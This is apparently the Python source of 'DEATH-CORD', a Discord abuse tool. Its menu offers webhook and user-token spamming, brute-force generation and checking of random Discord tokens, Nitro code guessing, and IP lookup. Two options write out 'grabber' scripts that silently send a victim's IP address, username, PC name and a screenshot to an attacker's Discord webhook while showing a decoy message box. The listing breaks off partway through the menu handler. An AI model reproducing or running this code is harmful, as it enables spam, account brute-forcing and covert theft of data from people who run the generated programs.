import os
import time
import random
from colorama import Fore
from discord_webhook import DiscordWebhook
import requests
from tkinter import messagebox
import webbrowser
import socket
from discord import SyncWebhook


def license():
    key = input(Fore.RED + f'[{Fore.LIGHTRED_EX}Enter license key{Fore.RED}]{Fore.RESET}: ')

    if key == 'LICENSE_KEY_LMAO':
        pass
        os.system('cls')
        time.sleep(1)
    else:
        messagebox.showerror('DEATH', 'Wrong license key!')
        quit()


# ┻ ┳ ┣ ┫ ╋ ┏ ┓ ┗ ┛ ━ ┃


os.system('title DEATH')
user_name = os.getlogin()
sleep_animation = 0.03

license()

def start():
    os.system('cls')
    print('\n' * 2)
    print(Fore.RED + '                       ▓█████▄ ▓█████ ▄▄▄     ▄▄▄█████▓ ██░ ██  ▄████▄   ▒█████   ██▀███  ▓█████▄ ')
    time.sleep(sleep_animation)
    print(Fore.RED + '                       ▒██▀ ██▌▓█   ▀▒████▄   ▓  ██▒ ▓▒▓██░ ██▒▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▀ ██▌')
    time.sleep(sleep_animation)
    print(Fore.RED + '                       ░██   █▌▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒░██   █▌')
    time.sleep(sleep_animation)
    print(Fore.RED + '                       ░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██ ▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ░▓█▄   ▌')
    time.sleep(sleep_animation)
    print(Fore.RED + '                       ░▒████▓ ░▒████▒▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▓')
    time.sleep(sleep_animation)
    print(Fore.RED + '                        ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒▓  ▒')
    time.sleep(sleep_animation)
    print(Fore.RED + '                        ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░   ░     ▒ ░▒░ ░  ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ▒  ▒')
    time.sleep(sleep_animation)
    print(Fore.RED + '                        ░ ░  ░    ░    ░   ▒    ░       ░  ░░ ░░        ░ ░ ░ ▒    ░░   ░  ░ ░  ░')
    time.sleep(sleep_animation)
    print(Fore.RED + '                          ░       ░  ░     ░  ░         ░  ░  ░░ ░          ░ ░     ░        ░')
    time.sleep(sleep_animation)
    print(Fore.RED + '                        ░                                      ░                           ░      ')
    time.sleep(sleep_animation)
    print(Fore.RESET + '                                              github.com/FR-birdit/DEATH-CORD')
    time.sleep(sleep_animation)
    print(Fore.RESET + '                                                     dsc.gg/deathcord')
    time.sleep(sleep_animation)

    print('\n' * 2)
    time.sleep(sleep_animation)

    print(Fore.RED + '       ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
    time.sleep(sleep_animation)
    print(Fore.RED + f'       ┃ {Fore.RESET}[{Fore.LIGHTRED_EX}01{Fore.RESET}] {Fore.RED}-{Fore.RESET} Webhook message sender{Fore.RESET}   {Fore.RESET}[{Fore.LIGHTRED_EX}08{Fore.RESET}] {Fore.RED}-{Fore.RESET} Random token spammer{Fore.RESET}   {Fore.RESET}[{Fore.LIGHTRED_EX}15{Fore.RESET}] {Fore.RED}-{Fore.RESET} IP Grabber{Fore.RESET}    {Fore.RESET}[{Fore.LIGHTRED_EX}22{Fore.RESET}] {Fore.RED}-{Fore.RESET} Coming soon!{Fore.RESET}  {Fore.RED}┃')
    time.sleep(sleep_animation)
    print(Fore.RED + f'       ┃ {Fore.RESET}[{Fore.LIGHTRED_EX}02{Fore.RESET}] {Fore.RED}-{Fore.RESET} Webhook spammer{Fore.RESET}          {Fore.RESET}[{Fore.LIGHTRED_EX}09{Fore.RESET}] {Fore.RED}-{Fore.RESET} Tokens spammer{Fore.RESET}         {Fore.RESET}[{Fore.LIGHTRED_EX}16{Fore.RESET}] {Fore.RED}-{Fore.RESET} PC Grabber{Fore.RESET}  {Fore.RESET}[{Fore.LIGHTRED_EX}23{Fore.RESET}] {Fore.RED}-{Fore.RESET} Coming soon!{Fore.RESET}  {Fore.RED}┃')
    time.sleep(sleep_animation)
    print(Fore.RED + f'       ┃ {Fore.RESET}[{Fore.LIGHTRED_EX}03{Fore.RESET}] {Fore.RED}-{Fore.RESET} Edit webhook message{Fore.RESET}     {Fore.RESET}[{Fore.LIGHTRED_EX}10{Fore.RESET}] {Fore.RED}-{Fore.RESET} Generate tokens{Fore.RESET}        {Fore.RESET}[{Fore.LIGHTRED_EX}17{Fore.RESET}] {Fore.RED}-{Fore.RESET} Coming soon!{Fore.RESET}  {Fore.RESET}[{Fore.LIGHTRED_EX}24{Fore.RESET}] {Fore.RED}-{Fore.RESET} Coming soon!{Fore.RESET}  {Fore.RED}┃')
    time.sleep(sleep_animation)
    print(Fore.RED + f'       ┃ {Fore.RESET}[{Fore.LIGHTRED_EX}04{Fore.RESET}] {Fore.RED}-{Fore.RESET} Delete webhook message{Fore.RESET}   {Fore.RESET}[{Fore.LIGHTRED_EX}11{Fore.RESET}] {Fore.RED}-{Fore.RESET} Generate nitros{Fore.RESET}        {Fore.RESET}[{Fore.LIGHTRED_EX}18{Fore.RESET}] {Fore.RED}-{Fore.RESET} Coming soon!{Fore.RESET}  {Fore.RESET}[{Fore.LIGHTRED_EX}25{Fore.RESET}] {Fore.RED}-{Fore.RESET} Github{Fore.RESET}        {Fore.RED}┃')
    time.sleep(sleep_animation)
    print(Fore.RED + f'       ┃ {Fore.RESET}[{Fore.LIGHTRED_EX}05{Fore.RESET}] {Fore.RED}-{Fore.RESET} Delete webhook{Fore.RESET}           {Fore.RESET}[{Fore.LIGHTRED_EX}12{Fore.RESET}] {Fore.RED}-{Fore.RESET} Generate IPs{Fore.RESET}           {Fore.RESET}[{Fore.LIGHTRED_EX}19{Fore.RESET}] {Fore.RED}-{Fore.RESET} Coming soon!{Fore.RESET}  {Fore.RESET}[{Fore.LIGHTRED_EX}26{Fore.RESET}] {Fore.RED}-{Fore.RESET} Discord{Fore.RESET}       {Fore.RED}┃')
    time.sleep(sleep_animation)
    print(Fore.RED + f'       ┃ {Fore.RESET}[{Fore.LIGHTRED_EX}06{Fore.RESET}] {Fore.RED}-{Fore.RESET} Webhook info{Fore.RESET}             {Fore.RESET}[{Fore.LIGHTRED_EX}13{Fore.RESET}] {Fore.RED}-{Fore.RESET} Get my IP{Fore.RESET}              {Fore.RESET}[{Fore.LIGHTRED_EX}20{Fore.RESET}] {Fore.RED}-{Fore.RESET} Coming soon!{Fore.RESET}  {Fore.RESET}[{Fore.LIGHTRED_EX}27{Fore.RESET}] {Fore.RED}-{Fore.RESET} Tool info{Fore.RESET}     {Fore.RED}┃')
    time.sleep(sleep_animation)
    print(Fore.RED + f'       ┃ {Fore.RESET}[{Fore.LIGHTRED_EX}07{Fore.RESET}] {Fore.RED}-{Fore.RESET} Token spammer{Fore.RESET}            {Fore.RESET}[{Fore.LIGHTRED_EX}14{Fore.RESET}] {Fore.RED}-{Fore.RESET} Lookup IP{Fore.RESET}              {Fore.RESET}[{Fore.LIGHTRED_EX}21{Fore.RESET}] {Fore.RED}-{Fore.RESET} Coming soon!{Fore.RESET}  {Fore.RESET}[{Fore.LIGHTRED_EX}28{Fore.RESET}] {Fore.RED}-{Fore.RESET} Exit{Fore.RESET}      V1.2{Fore.RED}┃')
    time.sleep(sleep_animation)
    print(Fore.RED + '       ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
    time.sleep(sleep_animation)

    death_cord()

print('')
def death_cord():
    try:
        user_input = input(Fore.RED + f'[{Fore.LIGHTRED_EX}{user_name}{Fore.RED}]{Fore.RESET}: ')

        if user_input == '1':
            webhook_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the webhook url\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            webhook_message = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the webhook message\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            try:
                webhook = DiscordWebhook(url=webhook_url, content=webhook_message, rate_limit_retry=True)
                response = webhook.execute()

                print(Fore.RED + f'Successfully sent {webhook_message}')
            except:
                print(Fore.RED + 'Something went wrong! Please check for mistakes.')
            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '2':
            webhook_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the webhook url\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            webhook_message = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the webhook message\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            webhook_repeat = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}How many times to send message?\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            try:
                for i in range(int(webhook_repeat)):
                    webhook = DiscordWebhook(url=webhook_url, content=webhook_message, rate_limit_retry=True)
                    response = webhook.execute()

                print(Fore.RED + f'Successfully sent {webhook_message} {webhook_repeat} times')
            except:
                print(Fore.RED + 'Something went wrong! Please check for mistakes.')
            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '7':
            spam_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste channel id\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            authorization_text = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            spam_text = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the spam text\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            repeat_spam = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}How many times to send message?\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            spam_url = f'https://discord.com/api/v9/channels/{spam_url}/messages'

            payload = {'content': spam_text}

            header = {'authorization': authorization_text}

            for i in range(int(repeat_spam)):
                r = requests.post(spam_url, data=payload, headers=header)
            print(Fore.RED + f'Successfully sent {spam_text} {repeat_spam} times')

            input(Fore.LIGHTRED_EX + 'Press enter')
            start()
        elif user_input == '10':
            sample_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
            create_amount = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}How many tokens to generate?\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            save_them = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Save them in tokens.txt? (y/n)\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            valid_tokens = []
            invalid_tokens = []

            valid_tokens_am = 0
            invalid_tokens_am = 0

            for i in range(int(create_amount)):
                first = ""
                second = ""
                third = ""

                for f in range(24):
                    first += random.choice(sample_chars)

                for f in range(6):
                    second += random.choice(f"{sample_chars}_")

                for f in range(27):
                    third += random.choice(sample_chars)

                token = f"{first}.{second}.{third}"
                headers = {'Authorization': token}

                r = requests.get('https://discord.com/api/v6/auth/login', headers=headers)
                status = r.status_code

                print(Fore.RED + f'Checking ==> {token}')
                r = requests.post(f'https://discord.com/api/v6/invite/{random.randint(1, 9999999)}', headers={'Authorization': token})
                if "You need to verify your account in order to perform this action." in str(r.content) or "401: Unauthorized" in str(r.content):
                    invalid_tokens.append(token)
                    invalid_tokens_am += 1
                    if save_them == 'y':
                        with open('tokens.txt', 'a') as f:
                            f.write(f'{token}\n')
                        with open('tokens_invalid.txt', 'a') as f:
                            f.write(f'{token}\n')
                else:
                    valid_tokens.append(token)
                    valid_tokens_am += 1
                    if save_them == 'y':
                        with open('tokens.txt', 'a') as f:
                            f.write(f'{token}\n')
                        with open('tokens_valid.txt', 'a') as f:
                            f.write(f'{token}\n')

            print(Fore.RED + f'Successfully generated {create_amount} tokens and saved in tokens.txt! Valid tokens: {valid_tokens_am}, invalid tokens: {invalid_tokens_am}')
            show_results = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Show the results? y/n\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            if show_results == 'y':
                print(f'Valid: {valid_tokens}')
                print(f'Invalid: {invalid_tokens}')
                input(Fore.LIGHTRED_EX + 'Press enter')
                start()
            else:
                input(Fore.LIGHTRED_EX + 'Press enter')
                start()

        elif user_input == '9':
            users = int(input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Users to spam (min 2, max 5)\n{Fore.RED}┗{Fore.LIGHTRED_EX}'))
            spam_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the channel id\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            spam_url = f'https://discord.com/api/v9/channels/{spam_url}/messages'


            if users == 2:
                authorization_text1 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №1\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                authorization_text2 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №2\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            elif users == 3:
                authorization_text1 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №1\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                authorization_text2 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №2\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                authorization_text3 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №3\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            elif users == 4:
                authorization_text1 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №1\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                authorization_text2 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №2\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                authorization_text3 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №3\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                authorization_text4 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №4\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            elif users == 5:
                authorization_text1 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №1\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                authorization_text2 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №2\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                authorization_text3 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №3\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                authorization_text4 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №4\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                authorization_text5 = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token for user №5\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            else:
                print(Fore.RED + 'Min is 2 users and Max is 5!')
                death_cord()

            spam_text = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the spam text\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            repeat_spam = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}How many times to send message?\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            payload = {'content': spam_text}

            if users == 2:
                header1 = {'authorization': authorization_text1}
                header2 = {'authorization': authorization_text2}
            elif users == 3:
                header1 = {'authorization': authorization_text1}
                header2 = {'authorization': authorization_text2}
                header3 = {'authorization': authorization_text3}
            elif users == 4:
                header1 = {'authorization': authorization_text1}
                header2 = {'authorization': authorization_text2}
                header3 = {'authorization': authorization_text3}
                header4 = {'authorization': authorization_text4}
            elif users == 5:
                header1 = {'authorization': authorization_text1}
                header2 = {'authorization': authorization_text2}
                header3 = {'authorization': authorization_text3}
                header4 = {'authorization': authorization_text4}
                header5 = {'authorization': authorization_text5}

            if users == 2:
                for i in range(int(repeat_spam)):
                    r = requests.post(spam_url, data=payload, headers=header1)
                    t = requests.post(spam_url, data=payload, headers=header2)
            elif users == 3:
                for i in range(int(repeat_spam)):
                    r = requests.post(spam_url, data=payload, headers=header1)
                    t = requests.post(spam_url, data=payload, headers=header2)
                    i = requests.post(spam_url, data=payload, headers=header3)
            elif users == 4:
                for i in range(int(repeat_spam)):
                    r = requests.post(spam_url, data=payload, headers=header1)
                    t = requests.post(spam_url, data=payload, headers=header2)
                    i = requests.post(spam_url, data=payload, headers=header3)
                    o = requests.post(spam_url, data=payload, headers=header4)
            elif users == 5:
                for i in range(int(repeat_spam)):
                    r = requests.post(spam_url, data=payload, headers=header1)
                    t = requests.post(spam_url, data=payload, headers=header2)
                    i = requests.post(spam_url, data=payload, headers=header3)
                    o = requests.post(spam_url, data=payload, headers=header4)
                    x = requests.post(spam_url, data=payload, headers=header5)

            print(Fore.RED + f'Successfully sent {spam_text} {repeat_spam} times with {users} users')
            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '11':
            sample_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
            generate_nitros = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}How many to generate?\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            save_them = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Save them in nitro.txt? (y/n)\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            nitro_code = ''

            for i in range(int(generate_nitros)):
                nitro_code = ''
                for i in range(16):
                    nitro_code += random.choice(sample_chars)
                nitro_code_link = f'https://discord.gift/{nitro_code}'
                print(f'Generated ==> {nitro_code_link}')

                if save_them == 'y':
                    with open('nitro.txt', 'a') as f:
                        f.write(f'{nitro_code_link}\n')

            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '12':
            generate_ips = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}How many to generate?\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            save_them = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Save them in ip.txt? (y/n)\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            first = ''
            second = ''
            third = ''
            fourth = ''

            for i in range(int(generate_ips)):
                first = random.randint(1, 255)
                second = random.randint(1, 255)
                third = random.randint(1, 255)
                fourth = random.randint(1, 255)

                entire_ip = f'{first}.{second}.{third}.{fourth}'
                print(f'Generated ==> {entire_ip}')
                first = ''
                second = ''
                third = ''
                fourth = ''

                if save_them == 'y':
                    with open('ip.txt', 'a') as f:
                        f.write(f'{entire_ip}\n')

            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '8':
            spam_messages = []

            spam_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the channel id\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            authorization_text = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Paste the token\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            spam_random = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}How many messages?\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            for i in range(int(spam_random)):
                spam_text = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the spam text\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                spam_messages.append(spam_text)
            repeat_spam = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}How many times to send message?\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            spam_url = f'https://discord.com/api/v9/channels/{spam_url}/messages'

            payload = {'content': spam_text}

            header = {'authorization': authorization_text}

            for i in range(int(repeat_spam)):
                payload = {'content': spam_messages[random.randint(0, int(spam_random) - 1)]}
                r = requests.post(spam_url, data=payload, headers=header)
            print(Fore.RED + f'Successfully sent {spam_text} {repeat_spam} times')

            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '13':
            hostname = socket.gethostname()
            response = requests.get('https://api64.ipify.org?format=json').json()
            ip_address = response["ip"]

            print(Fore.RESET + f'Your PC name is: {Fore.RED}{hostname}')
            print(Fore.RESET + f'Your IP address is: {Fore.RED}{ip_address}')
            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '14':
            ip_address = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the ip\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
            location_data = {
                "ip": ip_address,
                "network": response.get("network"),
                "version": response.get("version"),
                "city": response.get("city"),
                "region": response.get("region"),
                "region_code": response.get("region_code"),
                "country":response.get("country"),
                "country_name": response.get("country_name"),
                "country_code": response.get("country_code"),
                "country_code_iso3": response.get("country_code_iso3"),
                "country_capital": response.get("country_capital"),
                "country_tld": response.get("country_tld"),
                "continent_code": response.get("continent_code"),
                "in_eu": response.get("in_eu"),
                "postal": response.get("postal"),
                "latitude": response.get("latitude"),
                "longitude": response.get("longitude"),
                "timezone": response.get("timezone"),
                "utc_offset": response.get("utc_offset"),
                "country_calling_code": response.get("country_calling_code"),
                "currency": response.get("currency"),
                "currency_name": response.get("currency_name"),
                "languages": response.get("languages"),
                "country_area": response.get("country_area"),
                "country_population": response.get("country_population"),
                "asn": response.get("asn"),
                "org": response.get("org")
            }

            print(Fore.RESET + f'IP: {Fore.RED}{location_data["ip"]}')
            print(Fore.RESET + f'Network: {Fore.RED}{location_data["network"]}')
            print(Fore.RESET + f'Version: {Fore.RED}{location_data["version"]}')
            print(Fore.RESET + f'City: {Fore.RED}{location_data["city"]}')
            print(Fore.RESET + f'Region: {Fore.RED}{location_data["region"]}')
            print(Fore.RESET + f'Region code: {Fore.RED}{location_data["region_code"]}')
            print(Fore.RESET + f'Country: {Fore.RED}{location_data["country"]}')
            print(Fore.RESET + f'Country name: {Fore.RED}{location_data["country_name"]}')
            print(Fore.RESET + f'Country code: {Fore.RED}{location_data["country_code"]}')
            print(Fore.RESET + f'Country code iso3: {Fore.RED}{location_data["country_code_iso3"]}')
            print(Fore.RESET + f'Country capital: {Fore.RED}{location_data["country_capital"]}')
            print(Fore.RESET + f'Country tld: {Fore.RED}{location_data["country_tld"]}')
            print(Fore.RESET + f'Continent code: {Fore.RED}{location_data["continent_code"]}')
            print(Fore.RESET + f'In EU: {Fore.RED}{location_data["in_eu"]}')
            print(Fore.RESET + f'Postal: {Fore.RED}{location_data["postal"]}')
            print(Fore.RESET + f'Latitude: {Fore.RED}{location_data["latitude"]}')
            print(Fore.RESET + f'Longitude: {Fore.RED}{location_data["longitude"]}')
            print(Fore.RESET + f'Timezone: {Fore.RED}{location_data["timezone"]}')
            print(Fore.RESET + f'UTC Offset: {Fore.RED}{location_data["utc_offset"]}')
            print(Fore.RESET + f'Country calling code: {Fore.RED}{location_data["country_calling_code"]}')
            print(Fore.RESET + f'Currency: {Fore.RED}{location_data["currency"]}')
            print(Fore.RESET + f'Currency name: {Fore.RED}{location_data["currency_name"]}')
            print(Fore.RESET + f'Languages: {Fore.RED}{location_data["languages"]}')
            print(Fore.RESET + f'Country area: {Fore.RED}{location_data["country_area"]}')
            print(Fore.RESET + f'Country population: {Fore.RED}{location_data["country_population"]}')
            print(Fore.RESET + f'asn: {Fore.RED}{location_data["asn"]}')
            print(Fore.RESET + f'org: {Fore.RED}{location_data["org"]}')
            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '4':
            try:
                webhook_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the webhook url\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                message_id = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the webhook message id\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                webhook = DiscordWebhook(url=webhook_url, id=message_id)
                webhook.delete()
            except Exception as e:
                print(f'Something went wrong! Please check for mistakes')

            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '5':
            try:
                webhook_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the webhook url\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
                webhook = SyncWebhook.from_url(webhook_url)
                webhook.delete()
                print('Successfully deleted the webhook!')
            except:
                print('Something went wrong! Please check for mistakes')
            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '6':
            webhook_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the webhook url\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            try:
                r = requests.get(webhook_url)
                js = r.json()

                print(Fore.RESET + f"Name: {Fore.RED}{js['name']}")
                print(Fore.RESET + f"Guild ID: {Fore.RED}{js['guild_id']}")
                print(Fore.RESET + f"Channel ID: {Fore.RED}{js['channel_id']}")
                print(Fore.RESET + f"Webhook ID: {Fore.RED}{js['id']}")
                print(Fore.RESET + f"Webhook Token: {Fore.RED}{js['token']}")
            except:
                print('Something went wrong! Please check for mistakes')

            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '3':
            webhook_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the webhook url\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            message_id = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the message id\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            new_text = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the edited message\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            webhook = DiscordWebhook(url=webhook_url, id=message_id)
            webhook.content = new_text
            webhook.edit()

            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '15':
            webhook_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the webhook url\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            prog_name = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the program name\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            prog_message = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the program message (no = no message)\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            with open(f'{prog_name}.py', 'w') as f:
                f.write('from discord_webhook import DiscordWebhook \n')

            with open(f'{prog_name}.py', 'a') as f:
                f.write('from tkinter import messagebox \n')
                f.write('import requests \n')
                f.write('import os \n')
                f.write("response = requests.get('https://api64.ipify.org?format=json').json() \n")
                f.write("ip_address = response['ip'] \n")
                f.write("pc_name = os.getlogin() \n")
                f.write(f"webhook_url = '{webhook_url}' \n")
                f.write(f"webhook = DiscordWebhook(url=webhook_url, content=pc_name + ': ' + ip_address) \n")
                f.write("response = webhook.execute() \n")
                if prog_message != 'no':
                    f.write(f"messagebox.showinfo('dsc.gg/deathcord', '{prog_message}') \n")

            print(f'Done! The code is saved in the {prog_name}.py')
            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '16':
            webhook_url = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the webhook url\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            prog_name = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the program name\n{Fore.RED}┗{Fore.LIGHTRED_EX}')
            prog_message = input(Fore.RED + f'┏{Fore.LIGHTRED_EX}Enter the program message (no = no message)\n{Fore.RED}┗{Fore.LIGHTRED_EX}')

            with open(f'{prog_name}.py', 'w') as f:
                f.write('from discord_webhook import DiscordWebhook \n')

            with open(f'{prog_name}.py', 'a') as f:
                f.write('from tkinter import messagebox \n')
                f.write('import socket \n')
                f.write('import requests \n')
                f.write('import os \n')
                f.write('from PIL import ImageGrab \n')
                f.write("from discord import SyncWebhook \n")
                f.write("import discord \n")
                f.write('from datetime import datetime \n')
                f.write('now = datetime.now() \n')
                f.write('current_time = now.strftime("%Y-%m-%d %H:%M:%S") \n')
                f.write("response = requests.get('https://api64.ipify.org?format=json').json() \n")
                f.write("ip_address = response['ip'] \n")
                f.write("pc_name = hostname = socket.gethostname() \n")
                f.write("pc_username = os.getlogin() \n")
                f.write("screenshot = ImageGrab.grab()  \n")
                f.write("screenshot.save('screenshot.png')  \n")
                f.write("screenshot.close()  \n")
                f.write(f"webhook_url = '{webhook_url}' \n")
                f.write(f"webhook2 = SyncWebhook.from_url(f'{webhook_url}')  \n")
                f.write("with open(file='screenshot.png', mode='rb') as f:  \n")
                f.write("    my_file = discord.File(f)  \n")

                f.write(f"webhook = DiscordWebhook(url=webhook_url, content='IP: ' + ip_address) \n")
                f.write("response = webhook.execute() \n")

                f.write(f"webhook = DiscordWebhook(url=webhook_url, content='PC_username: ' + pc_username) \n")
                f.write("response = webhook.execute() \n")

                f.write(f"webhook = DiscordWebhook(url=webhook_url, content='PC_name: ' + pc_name) \n")
                f.write("response = webhook.execute() \n")

                f.write(f"webhook = DiscordWebhook(url=webhook_url, content='Date: (Y, M, D  H:M:S) ' + current_time) \n")
                f.write("response = webhook.execute() \n")

                f.write("webhook2.send('pc_screenshot:', username='webhook', file=my_file) \n")

                if prog_message != 'no':
                    f.write(f"messagebox.showinfo('dsc.gg/deathcord', '{prog_message}') \n")

            print(f'Done! The code is saved in the {prog_name}.py')
            input(Fore.LIGHTRED_EX + 'Press enter')
            start()

        elif user_input == '25':
            webbrowser.open('https://github.com/FR-birdit/DEATH-CORD')
            start()

        elif user_input == '26':
            webbrowser.open('https://dsc.gg/deathcord')
            start()

        elif user_input == '27':
            os.system('cls')
            
